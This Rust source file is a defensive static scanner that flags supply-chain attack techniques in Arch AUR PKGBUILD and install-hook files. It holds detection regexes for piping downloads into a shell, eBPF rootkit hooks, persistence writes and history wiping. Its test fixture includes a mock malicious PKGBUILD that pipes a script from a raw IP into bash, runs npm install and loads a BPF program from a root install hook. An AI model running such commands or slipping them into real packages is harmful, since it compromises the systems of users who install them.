//! Static analysis of PKGBUILD + `.install` hook files.
//!
//! Two passes:
//!   1. A table of line-oriented pattern rules ([`rules`]) that flag the
//!      specific techniques seen in AUR supply-chain attacks.
//!   2. A structural pass ([`scan_build_functions`]) that understands shell
//!      function bodies, so a network fetch inside `package()` (where there
//!      should be none — sources belong in the `source=()` array) is treated
//!      as more dangerous than the same string in a comment.
//!
//! This is intentionally conservative: findings are signals for review and
//! scoring, not a verdict on their own.

use regex::Regex;
use vouch_core::{Finding, Severity};
use vouch_pkgbuild::SourceBundle;

/// A single line-oriented detection rule.
struct Rule {
    id: &'static str,
    severity: Severity,
    title: &'static str,
    detail: &'static str,
    re: Regex,
}

fn rules() -> Vec<Rule> {
    let r = |p: &str| Regex::new(p).expect("static rule regex");
    vec![
        Rule {
            id: "scan.js-pkg-install",
            severity: Severity::Critical,
            title: "Installs a JavaScript package during build/install",
            detail: "`npm/pnpm/yarn/bun install` pulls and executes arbitrary code from \
                     a separate registry that the AUR never reviewed. This is the exact \
                     mechanism of the 'Atomic Arch' attack (atomic-lockfile / js-digest).",
            re: r(r"\b(npm|pnpm|yarn|bun)\b\s+(install|add|i|ci|x|exec|dlx)\b"),
        },
        Rule {
            id: "scan.pip-install",
            severity: Severity::High,
            title: "Installs a Python package during build/install",
            detail: "`pip install` fetches and runs setup code from PyPI, outside any \
                     AUR review. Dependencies should be declared as packages, not pulled \
                     ad-hoc.",
            re: r(r"\bpip[0-9.]*\s+install\b"),
        },
        Rule {
            id: "scan.pipe-to-shell",
            severity: Severity::Critical,
            title: "Pipes a downloaded file straight into a shell",
            detail: "`curl ... | sh` (or wget) runs remote code with no integrity check. \
                     The remote content can change at any time, after review.",
            re: r(r"(curl|wget|fetch)\b[^\n|]*\|\s*(sudo\s+)?(ba|z)?sh\b"),
        },
        Rule {
            id: "scan.ebpf",
            severity: Severity::Critical,
            title: "Touches eBPF / kernel tracing facilities",
            detail: "References to BPF maps, /sys/fs/bpf, libbpf or getdents64 hooking are \
                     hallmarks of the 'Atomic Arch' eBPF rootkit that hid its own files \
                     and processes. A normal package never needs this.",
            re: r(r"(/sys/fs/bpf|\bbpftool\b|\blibbpf\b|\bbpf_[a-z_]+\b|BPF_PROG|getdents64)"),
        },
        Rule {
            id: "scan.base64-decode",
            severity: Severity::High,
            title: "Decodes base64 (possible obfuscated payload)",
            detail: "Decoding base64 inline is a common way to hide a script or binary \
                     from a casual read of the PKGBUILD.",
            re: r(r"\bbase64\b\s+(-d|-D|--decode)\b"),
        },
        Rule {
            id: "scan.eval",
            severity: Severity::Medium,
            title: "Uses `eval` (dynamic code execution)",
            detail: "`eval` runs constructed strings as code; combined with a download or \
                     decode it can hide what actually executes.",
            re: r(r"\beval\b"),
        },
        Rule {
            id: "scan.setuid",
            severity: Severity::High,
            title: "Sets a setuid/setgid bit",
            detail: "Granting setuid/setgid to an installed file is a classic privilege \
                     escalation / persistence trick and is rarely legitimate in a PKGBUILD.",
            re: r(r"chmod\s+(u\+s|g\+s|\+s|[0-7]*[2467][0-7]{3})\b"),
        },
        Rule {
            id: "scan.persistence",
            severity: Severity::High,
            title: "Writes to an autostart / shell-init / scheduler location",
            detail: "Touching systemd units, cron, profile.d or shell rc files lets code \
                     persist and re-run after install. Packages install their own units \
                     via the package(), not by editing system-wide rc files directly.",
            re: r(
                r"(/etc/systemd/system|/etc/cron|/etc/profile\.d|\.bashrc|\.zshrc|\.profile|\.config/autostart|\bcrontab\s+-)",
            ),
        },
        Rule {
            id: "scan.suspicious-host",
            severity: Severity::High,
            title: "Downloads from an ephemeral file-sharing host",
            detail: "Sources hosted on paste/temp services can be swapped silently and \
                     are not appropriate origins for a package.",
            re: r(
                r"(pastebin\.com|anonfiles|transfer\.sh|0x0\.st|file\.io|bashupload|ghostbin|termbin)",
            ),
        },
        Rule {
            id: "scan.raw-ip-download",
            severity: Severity::Medium,
            title: "Downloads from a hardcoded IP address",
            detail: "Fetching from a raw IP (rather than a versioned, named release URL) \
                     is unusual and harder to audit or trust.",
            re: r(r"https?://\d{1,3}(\.\d{1,3}){3}"),
        },
        Rule {
            id: "scan.history-evasion",
            severity: Severity::Medium,
            title: "Clears shell history (anti-forensics)",
            detail: "Disabling or wiping shell history during install is an evasion \
                     behavior with no legitimate packaging purpose.",
            re: r(r"(history\s+-c|unset\s+HISTFILE|HISTFILE=/dev/null)"),
        },
    ]
}

/// Shell functions whose bodies should never make network calls — sources
/// belong in the `source=()` array, fetched and checksummed by makepkg.
const NET_FREE_FUNCS: &[&str] = &["prepare", "build", "check", "package"];
/// `.install` hook functions that run with **root** privileges via pacman.
const INSTALL_HOOK_FUNCS: &[&str] = &[
    "pre_install",
    "post_install",
    "pre_upgrade",
    "post_upgrade",
    "pre_remove",
    "post_remove",
];

pub fn evaluate(bundle: &SourceBundle) -> Vec<Finding> {
    let mut findings = Vec::new();
    let line_rules = rules();
    // Only count a network tool when it sits in *command position* — at line
    // start or right after a shell separator. This avoids matching the tool's
    // name when it appears as a substring/argument (e.g. `ftp` inside a sed
    // expression, or `wget` in a comment URL).
    let net_re = Regex::new(
        r"(?m)(?:^|[;&|(`]|&&|\|\||\bthen\b|\bdo\b|\$\()\s*(curl|wget|scp|rsync|ncat|socat)\b|\bgit\s+clone\b",
    )
    .expect("static regex");

    for (name, content) in bundle.files() {
        // Pass 1: line-oriented pattern rules.
        for (lineno, line) in content.lines().enumerate() {
            // Skip pure comment lines to cut obvious false positives.
            if line.trim_start().starts_with('#') {
                continue;
            }
            for rule in &line_rules {
                if rule.re.is_match(line) {
                    findings.push(Finding {
                        id: rule.id.into(),
                        severity: rule.severity,
                        title: rule.title.into(),
                        detail: rule.detail.into(),
                        location: Some(format!("{name}:{}", lineno + 1)),
                    });
                }
            }
        }

        // Pass 2: structural — network calls inside build/package functions.
        for func in extract_functions(content) {
            if NET_FREE_FUNCS.contains(&func.name.as_str())
                && let Some(rel) = net_re.find(&func.body)
            {
                let line = func.start_line + line_offset(&func.body, rel.start());
                findings.push(Finding {
                    id: "scan.net-in-build".into(),
                    severity: Severity::High,
                    title: format!("Network access inside {}()", func.name),
                    detail: "Sources must be declared in source=() so makepkg fetches \
                                 and checksums them. A network call inside this function \
                                 pulls unverified content at build time — the dependency \
                                 confusion vector behind 'Atomic Arch'."
                        .into(),
                    location: Some(format!("{name}:{line}")),
                });
            }

            if INSTALL_HOOK_FUNCS.contains(&func.name.as_str()) {
                findings.push(Finding {
                    id: "scan.install-hook".into(),
                    severity: Severity::Medium,
                    title: format!("Defines a {}() hook (runs as root)", func.name),
                    detail: "pacman runs install hooks as root. Read this function in full — \
                             it is the highest-impact code in the package and where the \
                             'Atomic Arch' payload was triggered."
                        .into(),
                    location: Some(format!("{name}:{}", func.start_line)),
                });
            }
        }
    }

    findings
}

struct ShellFunc {
    name: String,
    /// 1-based line where the function opens.
    start_line: usize,
    body: String,
}

/// Extract top-level shell function bodies via brace matching. Handles the
/// common `name() {` / `function name {` forms. Good enough for PKGBUILD/
/// `.install` files, which don't nest function definitions in practice.
fn extract_functions(content: &str) -> Vec<ShellFunc> {
    let header = Regex::new(r"(?m)^\s*(?:function\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*\)\s*\{")
        .expect("static regex");
    let bytes = content.as_bytes();
    let mut funcs = Vec::new();

    for cap in header.captures_iter(content) {
        let name = cap[1].to_string();
        let m = cap.get(0).unwrap();
        // Start scanning at the opening brace.
        let open = m.end() - 1;
        let mut depth = 0i32;
        let mut i = open;
        let mut body_start = open + 1;
        while i < bytes.len() {
            match bytes[i] {
                b'{' => {
                    depth += 1;
                    if depth == 1 {
                        body_start = i + 1;
                    }
                }
                b'}' => {
                    depth -= 1;
                    if depth == 0 {
                        let body = content[body_start..i].to_string();
                        let start_line = line_offset(content, m.start()) + 1;
                        funcs.push(ShellFunc {
                            name,
                            start_line,
                            body,
                        });
                        break;
                    }
                }
                _ => {}
            }
            i += 1;
        }
    }
    funcs
}

/// Number of newlines before `byte_offset` (i.e. 0-based line index).
fn line_offset(s: &str, byte_offset: usize) -> usize {
    s[..byte_offset.min(s.len())]
        .bytes()
        .filter(|&b| b == b'\n')
        .count()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::score;
    use vouch_core::{Decision, Severity};
    use vouch_pkgbuild::{SourceBundle, SourceFile};

    fn ids(findings: &[Finding]) -> Vec<&str> {
        findings.iter().map(|f| f.id.as_str()).collect()
    }

    // Mimics the "Atomic Arch" PKGBUILD + .install payload shape.
    fn malicious_bundle() -> SourceBundle {
        let pkgbuild = r#"
pkgname=totally-legit
build() {
    cd "$srcdir"
    curl https://1.2.3.4/x.sh | bash
}
package() {
    npm install atomic-lockfile minimist chalk
}
"#;
        let install = r#"
post_install() {
    bpftool prog load hide.o /sys/fs/bpf/x
    echo 'evil' >> ~/.bashrc
}
"#;
        SourceBundle {
            package_base: "totally-legit".into(),
            pkgbuild: pkgbuild.into(),
            install_files: vec![SourceFile {
                name: "totally-legit.install".into(),
                content: install.into(),
            }],
        }
    }

    #[test]
    fn detects_atomic_arch_signatures_and_refuses() {
        let findings = evaluate(&malicious_bundle());
        let got = ids(&findings);
        assert!(
            got.contains(&"scan.js-pkg-install"),
            "should flag npm install"
        );
        assert!(got.contains(&"scan.pipe-to-shell"), "should flag curl|bash");
        assert!(got.contains(&"scan.ebpf"), "should flag eBPF rootkit");
        assert!(
            got.contains(&"scan.net-in-build"),
            "should flag net in build()"
        );
        assert!(
            got.contains(&"scan.persistence"),
            "should flag .bashrc write"
        );
        assert!(
            got.contains(&"scan.install-hook"),
            "should flag root install hook"
        );

        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
        let verdict = score::build_verdict("totally-legit", findings);
        assert_eq!(verdict.decision, Decision::Refused);
    }

    #[test]
    fn clean_recipe_has_no_findings() {
        let bundle = SourceBundle {
            package_base: "clean".into(),
            pkgbuild: "pkgname=clean\nbuild() {\n  make\n}\npackage() {\n  make DESTDIR=\"$pkgdir\" install\n}\n".into(),
            install_files: vec![],
        };
        assert!(evaluate(&bundle).is_empty(), "clean recipe should be clean");
    }

    #[test]
    fn ftp_in_sed_is_not_a_network_call() {
        // Regression: `ftp` inside a sed expression must not match net-in-build.
        let bundle = SourceBundle {
            package_base: "x".into(),
            pkgbuild: "package() {\n  sed -e 's/x-scheme-handler\\/ftp;//g' file\n}\n".into(),
            install_files: vec![],
        };
        assert!(!ids(&evaluate(&bundle)).contains(&"scan.net-in-build"));
    }
}
